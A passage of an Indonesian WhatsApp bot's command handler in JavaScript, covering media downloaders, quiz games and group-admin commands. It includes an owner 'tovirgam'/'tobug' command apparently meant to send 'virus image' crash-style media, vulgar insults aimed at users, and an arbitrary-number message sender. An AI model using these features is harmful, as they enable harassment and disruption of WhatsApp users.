				}).catch((err) => reply(`Link tidak valid`))
			break 
case 'tiktokmusic': 
		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.error.api)
 		if (!c) return reply('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
    nowmm = await getBuffer(audio)
	ALIYABOT.sendMessage(from,nowmm ,MessageType.audio,{mimetype:'audio/mp4',quoted: mek})
		})
		})
		break
		case 'tiktokmusic': 
		case 'tiktokaudio':  
			if (!q) return reply('Linknya?')
			if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid Link')
			reply(mess.wait)
			let audi = q
			hx.ttdownloader(audi)
			.then(result => {
				const { wm, nowm, audio } = result
				axios.get(`https://tinyurl.com/api-create.php?url=${audio}`)
				.then(async (a) => {
					audnha = await getBuffer(audio)
					ALIYABOT.sendMessage(from,audnha , MessageType.document, {mimetype: 'audio/mp4',filename: `Tiktok Music.mp3`,quoted: mek})
					})
				}).catch((err) => reply(`Link tidak valid`))
			break
            case '#tiktoknowm':
                   case 'tiktokdl':
                   case 'tiktod':
case 'tiktoknowm':   
if (isBanned) return reply(mess.ban)
			if (!q) return reply('Linknya?')
			if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
			reply(mess.wait)
			let nowem = q
			hx.ttdownloader(nowem)
			.then(result => {
				const { wm, nowm, audio } = result
				axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
				.then(async (a) => {
					me = `*Link* : ${a.data}`
					noweem = await getBuffer(nowm)
					ALIYABOT.sendMessage(from,noweem , MessageType.document, {mimetype: 'video/mp4',filename: `Tiktok Download.mp4`,quoted: mek})
					})
				}).catch((err) => reply(`Link tidak valid`))
			break
			case 'tiktokwm2':
			if (isBanned) return reply(mess.ban)
      if (!isRegistered) return reply (mess.banned)
reply(mess.wait)
anu = await fetchJson (`https://docs-jojo.herokuapp.com/api/tiktok_wm?url=${args.join(' ')}`)
buffer = await getBuffer (anu.download)
sendButVideo(from, buffer, `By AlyaBot`, buffer, [                      
          {
            buttonId: `${prefix}ppcouple`,
            buttonText: {
              displayText: `Next︎`,
            },
            type: 1,
          },
        ]);                 
                    break					
case 'wiki': case 'wikipedia':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
reply(mess.wait)
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_Error Hasil Tidak Ditemukan_') 
}) 
result = `*JUDUL :* ${res[0].judul}

*WIKI :* ${res[0].wiki}`
sendMediaURL(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
reply(result)
})
break
case 'tiktokaudio2':
		case '#tiktokmusic':
		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
		 		if (!q) return fakegroup('Linknya?')
		ini_url = args[0]
		 		reply(mess.wait)
		            ini_urlnya = `https://hardianto-chan.herokuapp.com/api/download/tiktok?url=${ini_url}&apikey=hardianto`
                    get_result = await fetchJson(ini_urlnya)
                    ini_txt = `*DATA BERHASIL DI TEMUKAN*\n\nAuthor : ${get_result.author}\n`
                    ini_txt += `Caption : ${get_result.caption}\n`
                    ini_txt += `Views : ${get_result.views}`
                    ini_img = await getBuffer(get_result.thumbnail)
                    await ALIYABOT.sendMessage(from, ini_img , image, { quoted: mek, caption: ini_txt })
                    ini_buffer = await getBuffer(get_result.audio)
                    ALIYABOT.sendMessage(from, ini_buffer, audio, {mimetype: 'audio/mp4', filename: `${get_result.caption}.mp3`, quoted: mek })
            		break       
case 'remlogo':
          if (!isRegistered) return reply (mess.banned)
                if (args.length == 0) return grupinv(`Example: ${prefix + command} BotIndo`)
                    txt = args.join(" ")
                    reply(mess.wait)
                    buffer = await getBuffer(`https://hardianto-chan.herokuapp.com/api/bot/gfx5?apikey=${hardikey}&text=${txt}`)
                    ALIYABOT.sendMessage(from, buffer, image, { quoted: mek, caption: mess.success})
                    break
                    case 'slot':
              const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
              somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
              if (somtoyy  == '🍌 : 🍌 : 🍌') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍒 : 🍒') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🔔 : 🔔 : 🔔') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '?? : 🍐 : 🍐') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else if (somtoyy == '🍇 : 🍇 : 🍇') {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
              } else {
              reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
}
              break
              case 'listadmin':
					if (!isGroup) return reply(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break					
           case 'tebakkata':
		//if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (tebakkata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/tebakkata?apikey=${alphakey}`)
                    jawaban = `${anu.data.jawaban}`
                    tebakkata[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/tebakkata.json", JSON.stringify(tebakkata))
                    console.log(jawaban)
                    tebakya = anu.data.soal
                    ALIYABOT.sendMessage(from, tebakya + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10' , text, {quoted: mek})
                    await sleep(120000)
                    if (tebakkata.hasOwnProperty(sender.split('@')[0])) {
                                ALIYABOT.sendMessage(from, "⏰ Waktu permainan habis ⏰" + '\n\n' +"*🔥 Jawaban :*"  + '' + '_'+ jawaban +'_', text, {quoted: mek}) // ur cods
								delete tebakkata[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakkata.json", JSON.stringify(tebakkata))
                    }
                    await gameAdd(sender, glimit)
					break
					case 'setppgc':
					case 'setppgrup':          
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (isQuotedImage) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
   let media = await ALIYABOT.downloadMediaMessage(encmedia)
   ALIYABOT.updateProfilePicture(from, media)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   } else if (isQuotedSticker){
   if (mek.message.videoMessage) return reply('Error Bro Wkwkwk')
   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia)
   ran = getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
   fs.unlinkSync(media)
   if (err) return reply('Gagal, hehehe')
   buffer = fs.readFileSync(ran)
   ALIYABOT.updateProfilePicture(from, buffer)
   fs.unlinkSync(ran)
   })
   } else {
   reply(`Kirim atau tag gambar/sticker dengan caption ${prefix}setppgrup ya sayang 💕`)
   }
   break                   
                    case 'getpict':
				case 'getpic':
					case 'getpp':
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await ALIYABOT.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            ALIYABOT.sendMessage(from, pict, image, {quoted: mek})
            break
            case 'link':
            case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply('Bot harus jadi admin tot')
					linkgc = await ALIYABOT.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					ALIYABOT.sendMessage(from, yeh, text, { quoted: mek })
					break
				case 'chat':
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            ALIYABOT.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
      case "sider":
      if (isBanned) return reply(mess.ban)
        if (!m.quoted) throw `Balas pesan bot!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await ALIYABOT.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await ALIYABOT.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} tersisa` : ""}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim();
        m.reply(txt, null, {
          contextInfo: {
            mentionedJid: ALIYABOT.parseMention(txt),
          },
        });
        break;                            
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                if (isBanned) return reply(mess.ban)
                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${setting.lolkey}&text1=${txt1}&text2=${txt2}`)
                          buttons = [{buttonId: `!menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'ℎ𝑒𝑟𝑚𝑎𝑛 𝐵𝑜𝑡𝑧☕', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @cal_me_herman`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              ALIYABOT.relayWAMessage(prep)
        
                    break
case 'pla2929y': case 'song':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
			var srch = args.join(' ')
			aramas = await yts(srch);
			aramat = aramas.all 
			var mulaikah = aramat[0].url
			try {
				xa.Youtube(mulaikah).then(async (data) => {
					if (Number(data.medias[7].formattedSize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captions = `*---- 「 PLAY MUSIC 」----*
						
• Title : ${aramas.videos[0].title}
• ID : ${aramas.videos[0].videoId}
• Upload : ${aramas.videos[0].ago}
• Size : ${data.medias[7].formattedSize}
• Views: ${aramas.videos[0].views} 
• Duration : ${aramas.videos[0].timestamp}
• Url : ${aramas.videos[0].url}`
var thumbyt = await getBuffer(aramas.videos[0].thumbnail)
sendButLocation(from, captions, '${fakeyoi}', thumbyt, [{buttonId: `.ytmp4 ${mulaikah}`, buttonText: {displayText: 'Video'}, type: 1},{buttonId: `.ytmp3 ${mulaikah}`, buttonText:{displayText: 'Audio'}, type: 1}], {quoted: mek})
						})
				} catch (err) {
					reply('Terjadi kesalahan')
					}
			break                    
                    case 'play':
                    case 'playv2':
                if (isBanned) return reply(mess.ban)                                    
                if (args.length === 1) return reply(`Kirim perintah *${command} query*`)
                try {
                    reply(mess.wait)
                    yts(q)
                    .then(async (res) =>{
                    let qqppp = [{
                        "buttonId": `${prefix}playmp3 ${res.videos[0].url}`,
                        "buttonText": {
                            "displayText": "AUDIO"
                            },
                        "type": "RESPONSE"
                        },{
                    "buttonId": `${prefix}playmp4 ${res.videos[0].url}`,
                    "buttonText": {
                        "displayText": "VIDEO"
                    },
                    "type": "RESPONSE"
                }]
                sendButLocation(from, `PLAY YOUTUBE`, `Hai @${sender.split('@')[0]}\n•💬 Judul : ${res.videos[0].title}\n•⏳Decriptions : ${res.videos[0].description}\n🎥 ID Video : ${res.videos[0].videoId}\n•⏰️ Diupload Pada : ${res.videos[0].ago}\n•👁️️ Views : ${res.videos[0].views}\n•▶️ Durasi : ${res.videos[0].timestamp}\n•📍 Channel : ${res.videos[0].author.name}\n•🔗 Link Channel : ${res.videos[0].author.url}`, `silahkan dipilih video atau audio?`, qqppp, await getBuffer(thumb), [sender])              
                })
                    .catch((err) => reply(`${err}`))
                } catch (err) {
                    ALIYABOT.sendMess(ownerNumber[0], 'PlayMp3 Error : ' + err)
                    console.log(color('[PlayMp3]', 'red'), err)
                    reply(mess.error.api)
                }
                break
                case 'song':
                 if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
			var srch = args.join(' ')
			aramas = await yts(srch);
			aramat = aramas.all 
			var mulaikah = aramat[0].url
			try {
				yta.Youtube(mulaikah).then(async (data) => {
					if (Number(data.medias[7].formattedSize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captions = `*---- 「 PLAY MUSIC 」----*
						
• Title : ${aramas.videos[0].title}
• ID : ${aramas.videos[0].videoId}
• Upload : ${aramas.videos[0].ago}
• Size : ${data.medias[7].formattedSize}
• Views: ${aramas.videos[0].views} 
• Duration : ${aramas.videos[0].timestamp}
• Url : ${aramas.videos[0].url}`
var thumbyt = await getBuffer(aramas.videos[0].thumbnail)
sendButLocation(from, captions, '© ' + ownername, thumbyt, [{buttonId: `.ytmp4 ${mulaikah}`, buttonText: {displayText: 'Video'}, type: 1},{buttonId: `.ytmp3 ${mulaikah}`, buttonText:{displayText: 'Audio'}, type: 1}], {quoted: mek})
						})
				} catch (err) {
					reply('Terjadi kesalahan')
					}
			break                             
      case "q":
        if (!m.quoted) return reply("reply message!");
        let qse = ALIYABOT.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case "kick":
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return grupinv('Only Admin');
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag target yang ingin di kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          ALIYABOT.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          ALIYABOT.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          ALIYABOT.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;
        case 'image':
       case 'gimage':
       case 'googleimage':
              if (args.length < 1) return reply('Apa Yang Mau Dicari?')
             reply(`PEROSES`)
              teks = args.join(' ')
              res = await googleImage(teks, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
              else {
              gugIm = result
              random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
             break       
       case 'telesticker': 
       case 'telestiker':
              if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
               reply(`PEROSES`)
              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${setting.lolkey}&url=${args[0]}`)
              ini_sticker = ini_url.result.sticker
              reply('Sending '+ ini_sticker.length +' stickers...')
              for (sticker_ in ini_sticker) {
              ini_buffer = await getBuffer(ini_sticker[sticker_])
              ALIYABOT.sendMessage(from, ini_buffer, sticker, {})
}
              break
        case 'tagall':
        case 'otagall':
        case 'tgall':
        if (isBanned) return reply(mess.ban)
           if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");           
              if (!isGroup) return reply(mess.only.group)
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
              case 'infoall':                   
              	if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
					if (!isGroup) return reply('this feature is only for groups')					
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `_/\_ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break 
case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					ALIYABOT.sendMessage(from, tagu, text, { quoted: foncevid, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
      case "add":
        return reply('*Disable By Owner*')
        break;
case 'igtv': case 'tvig': case 'instagramtv':  
	 if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return reply("The link?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              ALIYABOT.sendMessage(from, link, video, {
                quoted: mek,
                caption: `By AlyaBot`,
              });
            } else {
              let link = await getBuffer(i.url);
              ALIYABOT.sendMessage(from, link, image, {
                quoted: mek,
                caption: `By AlyaBot`,
              });
            }
          }
        });
        break;        
        case 'ig':
case 'igdl':
case 'instagram':
if (isBanned) return reply(mess.ban)
if (!c) return reply('Linknya?')
reply(mess.wait);
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
case 'igstory': 
if (isBanned) return reply(mess.ban)
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    ALIYABOT.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    ALIYABOT.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
            case 'fbdl':
      case 'fb':
      case "facebook":
      if (isBanned) return reply(mess.ban)
              return reply('*Server Sedang Erorr*')
        break;
            case 'apikey':
            return reply('*https://api-alya-chan.herokuapp.com/https://api-aprilia-xyz.herokuapp.com*')
case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
            case 'mediafire':
               return reply('*Server 404 Erorr*')
break
      case "getbio":
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await ALIYABOT.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
      // Get Name
      case "getname":
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          ALIYABOT.contacts[ambl] != undefined
            ? ALIYABOT.contacts[ambl].sname || ALIYABOT.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        ALIYABOT.groupUpdateDescription(from, `${args.join(" ")}`);
        ALIYABOT.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
      // Set Name Group
      case "setname":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        ALIYABOT.groupUpdateSubject(from, `${args.join(" ")}`);
        ALIYABOT.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break;
      // Group Info
      case "groupinfo":
        if (!isGroup) return;
        ppUrl = await ALIYABOT.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        ALIYABOT.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`,
        });
        break;
      // Demote Admins
      case 'demote':
					if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Demote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						ALIYABOT.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`Berhasil Demote @${mentioned[0].split('@')[0]} Menjadi Member Group!`, mentioned, true)
						ALIYABOT.groupDemoteAdmin(from, mentioned)
					}
					break
      // Promote Members
      case 'promote':
					if (!isGroup && !isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Promote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(from, mentioned, true)
						ALIYABOT.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`Berhasil Promote @${mentioned[0].split('@')[0]} Sebagai Admin Group!`, mentioned, true)
						ALIYABOT.groupMakeAdmin(from, mentioned)
					}
					break
      case "closegc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        ALIYABOT.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;                          
        case 'cek':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Matahari tenggelam di sebelah…?..

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `ck`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;
        case 'ck':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Makanan yang dibungkus daun pisang?.

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `cok`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;
        case 'tovirgam':
  case 'jadivirgam':
    case 'tobug':
if (!isOwner && !mek.key.fromMe) return reply('Only Owner')    
if (!isQuotedSticker) return reply(' reply sticker Yang mau dijadikan Virgam anjeng')
reply(mess.wait)
const virgamnye = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
virgamm = await ALIYABOT.downloadAndSaveMediaMessage(virgamnye, './stik/sampah')
ran = getRandom('.png')
exec(`ffmpeg -i ${virgamm} ${ran}`, (err) => {
fs.unlinkSync(virgamm)
if (err) return reply('BABI KALI KAU, VIRGAM = VIRUS GAMBAR, NAH GAMBAR EMANG ADA YANG BERGERAK? TOLOL..!!')
buffer = fs.readFileSync(ran)
ALIYABOT.sendMessage(from, buffer, image, {quoted: mek, thumbnail:virgam, caption: '🥶ALYA✓CHAN🥶'})
fs.unlinkSync(ran)
})
break
        case 'cok':
        case 'susunkata':
        case 'asahotak':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Apabila mengendarai mobil wajib bawa.

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `c`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;
        case 'c':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Jangan membuang tisu di….

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `lol`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;
        case 'pornohub':
                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                  buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`)
                 buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Bilang Makaseh Anj', imageMessage: imageMsg,
              contentText:`${rply}`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: dep})
              ALIYABOT.relayWAMessage(prep)
        
                    break
        case 'lol':
if (!isRegistered) return reply(ind.only.daftarB)
wibu = `Hewan yang berubah warna kalau ada musuhnya?.

gak jawab lol kontol 
timeout : *120:00 detik*
Jika benar anda tkdak goblok
`
                   sendButMessage(from, wibu, `by alya-chan`, [
          {
            buttonId: `ceklontong`,
            buttonText: {
              displayText: `Main Lagi `,
            },
            type: 1,
          },]);
        break;
        case 'tebakanime':
					if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/tebak-anime?apikey=BETA`)
                    tebak = anu.soal
                    jawaban = anu.jawaban
                    tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    ALIYABOT.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(30000)
                    if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakanime[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                    }
                    break        
        case 'tebaklirik':
              if (!isRegistered && !itsMe && !isOwner) return reply(`Limit game kamu sudah habis`)
              if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
              get_result = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/lirik`, {method: 'get'})
              get_result = get_result.result
              jawaban = get_result.answer
              kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
              pertanyaan = get_result.question
              ALIYABOT.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :'+pertanyaan+'\n• *Kisi²* :'+kisi_kisi, text, { quoted: freply}).then(() => {
              tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
